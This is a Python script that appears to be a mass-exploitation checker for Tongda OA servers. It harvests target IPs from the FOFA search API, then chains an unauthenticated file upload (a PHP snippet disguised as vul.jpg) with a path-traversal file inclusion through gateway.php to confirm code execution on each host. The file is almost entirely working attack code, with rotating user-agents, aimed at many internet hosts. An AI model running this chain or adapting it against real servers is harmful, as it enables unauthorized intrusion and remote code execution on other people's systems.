# Author: Nick Yan

import requests
from random import choice

pic = '''
     __                    _               ___     ___   
    / _|  _  _     __     | |__           / _ \   /   \  
   |  _| | +| |   / _|    | / /    ___   | (_) |  | - |  
  _|_|_   \_,_|   \__|_   |_\_\   |___|   \___/   |_|_|  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
'''

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}


USER_AGENT = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
	"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
	"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
	"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
	"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
	"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
]

def fofa():
    """
    调用 fofa api 搜集 IP
    """
    addr = "https://fofa.so/api/v1/search/all"
    headers = {}
    cookies = {}
    headers["User-Agent"] = choice(USER_AGENT)

    parameters = {
        # 这里填入 api 参数
    }

    try:
        resp = requests.get(url=addr, params=parameters, headers=headers, cookies=cookies, proxies=proxies, timeout=8, verify=False)

        if resp.status_code != 200:
            print(f"[-] fofa 请求报错！请检查。响应码为 {resp.status_code}")
        
        data = resp.json()["results"]
        with open("oa_ip.txt",'w') as f_write:
            for i in data:
                f_write.write(f"{i[0]}\n")
        print("[+] 已将结果写入 IP 池。")
        return True
    except Exception as e:
        print(e)
        return False

def IP_check(IP):
    """
    判断 IP 是否以 http/https 开头
    """
    if IP.startswith("http://") or IP.startswith("https://"):
        return IP
    else:
        IP = f"http://{IP}"
        return IP

target_uri = "/ispirit/im/upload.php"
target_uri_2 = "/general/../../attach/im"
target_uri_3 = "/ispirit/interface/gateway.php"

def upload(IP):
    """
    上传文件
    """
    headers = {}
    cookies = {}
    headers["User-Agent"] = choice(USER_AGENT)
    headers["Content-Type"] = "multipart/form-data; boundary=---------------------------19520547671076793750827862981"
    headers["Connection"] = "close"
    headers["Upgrade-Insecure-Requests"] = "1"

    check_url = f"{IP}{target_uri}"

    try:
        payload = '''-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="P"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="MSG_CATE"

file
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="UPLOAD_MODE"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="DEST_UID"

1
-----------------------------19520547671076793750827862981
Content-Disposition: form-data; name="ATTACHMENT"; filename="vul.jpg"
Content-Type: image/jpeg

<?php echo "flag: Vulnerable.";?>

-----------------------------19520547671076793750827862981--
        '''
        print(f"[-] Now upload file to {IP}")
        resp = requests.post(url=check_url, headers=headers, data=payload, cookies=cookies, proxies=proxies, timeout=8, verify=False)

        if not resp:
            print("[-] Upload failed...  1")
            return False

        if resp.status_code == 200 and (resp.json()["status"] == 1 or resp.json()["status"] == '1'):
            print("[+] Upload successfully!")
            path_data = resp.text[resp.text.find("@")+1:resp.text.rfind("|")].replace("_", "/").replace("|", ".")
            fi_path = f"{target_uri_2}/{path_data}"
            print(f"[-] Now include {fi_path}")
            return fi_path

        else:
            print("[-] Upload failed...  2")
            return False

    except Exception as e:
        print(e)
        return False

def fi(IP, fi_path):
    """
    文件包含验证
    """
    if not fi_path:
        return False

    headers = {}

    try:
        headers["User-Agent"] = choice(USER_AGENT)
        cookies = {}
        check_url_2 = f"{IP}{target_uri_3}"
        payload_2 = {
            "json": "{}",
            "url": f"{fi_path}"
        }

        resp_2 = requests.post(url=check_url_2, headers=headers, data=payload_2, cookies=cookies, proxies=proxies, timeout=8, verify=False)

        if not resp_2:
            return False
        if resp_2.status_code != 200 or not resp_2.text:
            return False

        print(resp_2.text)
        print("[+] {IP} is vulnerable.")
        print("=========================\n\n")
        return True

    except Exception as e:
        print(e)
        return False

if __name__ == "__main__":
    print(f"{pic}\n")
    #fofa()
    #exit()

    with open("oa_ip.txt", "r") as f:
        IPS = f.readlines()

        for IP in IPS:
            IP = IP.strip()
            #upload(IP)
            fi(IP_check(IP), upload(IP_check(IP)))
